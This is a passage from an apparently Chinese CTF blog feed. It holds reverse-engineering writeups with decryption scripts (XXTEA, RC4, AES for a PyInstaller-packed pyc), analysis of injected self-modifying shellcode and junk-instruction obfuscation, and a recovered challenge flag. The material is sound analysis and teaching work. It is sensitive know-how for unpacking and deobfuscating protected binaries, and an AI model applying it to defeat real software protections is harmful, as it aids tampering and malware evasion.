    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;;
    btea(v,n,k);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;解密后的数据：0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x %08x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]); 
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后再接一个RC4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__rc4_init&lt;/span&gt;(key):
    keylength &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;))
    j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; int(key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; keylength])) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; S

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rc4_crypt&lt;/span&gt;(key, data):
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __rc4_init(key)
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; data:
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
        k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; S[(S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[j]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
        print (hex(S[(S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[j]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;]))
        result &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; k
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s, s2n
    key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x00\x00\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x10\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n2s(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5604b0d49c634d3096cec00593be3b82524b16b28a33b74d6d7b9950c2b10c12e1840a93&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;convert&lt;/span&gt;(k):
        ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:    
            ret&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;)
            k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    result_rc4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rc4_crypt(key,data)
    print(result_rc4)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意一下大小端就行&lt;/p&gt;</description>
        </item>
        <item>
        <title>CISCN-N 2021 RE Writeup</title>
        <link>/post/ciscn-n-2021-re-writeup/</link>
        <pubDate>Tue, 22 Jun 2021 23:25:43 +0000</pubDate>
        
        <guid>/post/ciscn-n-2021-re-writeup/</guid>
        <description>&lt;h2 id=&#34;imnotavirus&#34;&gt;imnotavirus&lt;/h2&gt;
&lt;p&gt;解exe，解密pyc&lt;/p&gt;
&lt;p&gt;利用解密后的pyc，找到注入的shellcode，用ida解smc，最后解密&lt;/p&gt;
&lt;p&gt;比赛的时候还被迫阅读了一下pyinstaller的源码，收获很大&lt;/p&gt;
&lt;h3 id=&#34;解exe&#34;&gt;解exe&lt;/h3&gt;
&lt;p&gt;看到附件给了个pyinstaller，猜测是python逆向&lt;/p&gt;
&lt;p&gt;先ida看一眼，有upx壳，自动脱壳，再用exeinfo确认了一下是python逆向，pyinstxtractor.py解包（之前V&amp;amp;N2021就吃了这个亏）&lt;/p&gt;
&lt;h3 id=&#34;解pyc&#34;&gt;解pyc&lt;/h3&gt;
&lt;p&gt;解包时提示被加密了&lt;/p&gt;
&lt;p&gt;取struct头作为标准头，用pycdc还原出main.py，发现调用了sign&lt;/p&gt;
&lt;p&gt;去PYZ00文件夹看一下，发现被加密了，看一下目录，发现pyimod和比一般情况多了一些东西，把这些都解开看一下，有一个key文件&lt;/p&gt;
&lt;p&gt;同时发现archive中有一个Cipher类，但是pycdc缺少指令，无法全部还原，考虑看一下pycdas解出来的字节码&lt;/p&gt;
&lt;p&gt;字节码中有个对pyinstaller源码的引用，直接去文件夹里面看，发现能解密出来的部分完全一致&lt;/p&gt;
&lt;p&gt;照着源码中的方法解密sign&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; key
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tinyaes

print (key)

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./PYZ-00.pyz_extracted/sign.pyc.encrypted&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)

data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tinyaes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AES(key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(), data[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;])
output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CTR_xcrypt_buffer(data[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:])

f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; zlib
output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; zlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decompress(output)

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./sign.pyc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(output)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;解密&#34;&gt;解密&lt;/h3&gt;
&lt;p&gt;解出sign后看到有三个base64，其中两个是执行的语句，此外大部分语句涉及到了内存&lt;/p&gt;
&lt;p&gt;另外一个base解出来是乱码，用字节码辅助恢复函数（其实特征已经很明显了），发现进行了rc4加密，直接打印出解密结果，将结果写入文件，用ida查看&lt;/p&gt;
&lt;p&gt;发现smc&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-asmmible&#34; data-lang=&#34;asmmible&#34;&gt;        mov     eax, 41178Bh
        mov     ecx, 411802h
        sub     ecx, eax
loc_2A:
        mov     ebx, [rax]
        xor     ebx, 77h
        mov     [rax], ebx
        loop    loc_2A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解出来后尝试恢复了一下函数，结果很丑&amp;hellip;只能和汇编比较着进行分析了（好像只要把00 patch一下就可以反编译了）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;seg000:000000000000007E loc_7E:                                 ; CODE XREF: sub_0+73↑j
seg000:000000000000007E                 mov     eax, [rbp+var_20]
seg000:0000000000000081                 cmp     eax, [rbp+var_8]
seg000:0000000000000084                 jge     short loc_B2
seg000:0000000000000086                 mov     eax, [rbp+8]
seg000:0000000000000089                 add     eax, [rbp+var_20]
seg000:000000000000008C                 movsx   ecx, byte ptr [rax]
seg000:000000000000008F                 xor     ecx, 13h
seg000:0000000000000092                 mov     edx, [rbp+8]
seg000:0000000000000095                 add     edx, [rbp+var_20]
seg000:0000000000000098                 mov     [rdx], cl
seg000:000000000000009A                 mov     eax, [rbp+8]
seg000:000000000000009D                 add     eax, [rbp+var_20]
seg000:00000000000000A0                 movsx   ecx, byte ptr [rax+1]
seg000:00000000000000A4                 xor     ecx, 37h
seg000:00000000000000A7                 mov     edx, [rbp+8]
seg000:00000000000000AA                 add     edx, [rbp+var_20]
seg000:00000000000000AD                 mov     [rdx+1], cl
seg000:00000000000000B0                 jmp     short loc_75
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现是两两一组进行加密，分别异或0x13和0x37&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(cipher)):
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;             print (chr(cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;             print (chr(cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@rey0ug0nn2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;gnth1s0r1tw1llb3y0ursurv1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;内卷&#34;&gt;内卷&lt;/h2&gt;
&lt;p&gt;这题是赛后边补边写的，所以废话略多&lt;/p&gt;
&lt;h3 id=&#34;花指令&#34;&gt;花指令&lt;/h3&gt;
&lt;p&gt;搜索静态字符串能找到很多有用的字符串，但发现找不到引用&lt;/p&gt;
&lt;p&gt;从start开始往里面翻一翻，发现有个一大片数据没有被解析出来，说明是个花指令，之前没见过这个花，简单记录一下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:00000001400016AB                 call    loc_1400016B3
.text:00000001400016AB ; ---------------------------------------------------------------------------
.text:00000001400016B0                 db 0E8h, 0EBh, 12h
.text:00000001400016B3 ; ---------------------------------------------------------------------------
.text:00000001400016B3
.text:00000001400016B3 loc_1400016B3:                          ; CODE XREF: sub_1400015E2+C9↑j
.text:00000001400016B3                 pop     rax             ; 取出栈顶数据
.text:00000001400016B4                 add     rax, 1          ; 对其进行+1
.text:00000001400016B8                 push    rax             ; 然后再压栈
.text:00000001400016B9                 mov     rax, rsp
.text:00000001400016BC                 xchg    rax, [rax]
.text:00000001400016BF                 pop     rsp
.text:00000001400016C0                 mov     [rsp+0], rax
.text:00000001400016C4                 retn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个花长这样，所以 &lt;code&gt;Call loc_1400016B3&lt;/code&gt; 的操作就是跳过 &lt;code&gt;E8&lt;/code&gt;，把第一个&lt;code&gt;E8&lt;/code&gt; patch成nop，发现&lt;code&gt;EB 12&lt;/code&gt;就是跳到这个函数的后面，所以这条 &lt;code&gt;Call&lt;/code&gt; 指令也可以Patch掉&lt;/p&gt;
&lt;p&gt;还有一些长跳转，这个就直接按c转成指令就行&lt;/p&gt;
&lt;p&gt;还有这个花&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:0000000140006D12 loc_140006D12:                          ; CODE XREF: sub_1400015E2:loc_140006D12↑j
.text:0000000140006D12                 jmp     short near ptr loc_140006D12+1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把 &lt;code&gt;jmp&lt;/code&gt; 指令的第一个字节patch了就行&lt;/p&gt;
&lt;p&gt;花指令全部去掉之后发现结尾还有一部分没有反编译，这个比赛的时候没想出来怎么搞，不知道怎么回时，所以这题后面也就没有怎么做了&lt;/p&gt;
&lt;h3 id=&#34;运算简化&#34;&gt;运算简化&lt;/h3&gt;
&lt;p&gt;比赛的时候想直接动调跳过这些运算的，结果看到和input还有关系，这就不好办了，尝试手动看一下这是什么运算，但也没啥想法&lt;/p&gt;
&lt;p&gt;结果，晚上再看这道题的时候发现竟然看懂这个离谱运算了，啊啊啊啊啊好气啊&lt;/p&gt;
&lt;p&gt;虽然有一堆函数，观察发现，通常每一个for循环中，包裹了两个while循环，但比赛的时候一直以for循环为单位在想代码的含义，晚上再看的时候才发现，每一个while循环才是一个单位函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;v1155 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ll;
v1154 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;i64;
v1153 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ll &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
v1152 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ll &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v1153 ) {
    v1151 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1152;
    v1150 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1153;
    v1153 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1153) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; v1152;
    v1152 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v1150;
}
ll &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1152;


v1041 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1043;
v1040 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1045;
v1039 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1045 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; v1043;
v1038 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1045 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v1043; &lt;span style=&#34;color:#75715e&#34;&gt;// 运算简化方法：^ 换成 +，然后只保留这一行和最后一行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v1039 ) {
    v1037 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1038;
    v1036 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1039;
    v1039 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1039) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; v1038;
    v1038 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v1036;
}
v1043 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1038;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单地说，上面这段代码，最终的执行效果就是，&lt;code&gt;ll = ll + 1&lt;/code&gt;，推广到下半部分，就是 &lt;code&gt;v1043 = v1038 = v1043 + v1045&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;好了，到此，就可以完成简化了，之后就变成了一个for循环里面一条自增的语句，所以就转换成了乘法&lt;/p&gt;
&lt;p&gt;手动将这些代码整理好看一点，就长下面这样了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( ii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ii &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i) {
    v1043 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ii &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
    v1169 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;list_a_v19[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ii];
    input_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1043;
    input_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1043 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
    sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    delta &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;884811923&lt;/span&gt;;
    key0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1169[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    key1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1169[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1169[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    key3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1169[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( mm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; mm &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;; mm&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; ) {
        sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; delta &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum;
        v1135 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; input_2;
        v1118 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1135;
        v1112 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; input_2;
        v1109 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
        v1106 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1109;
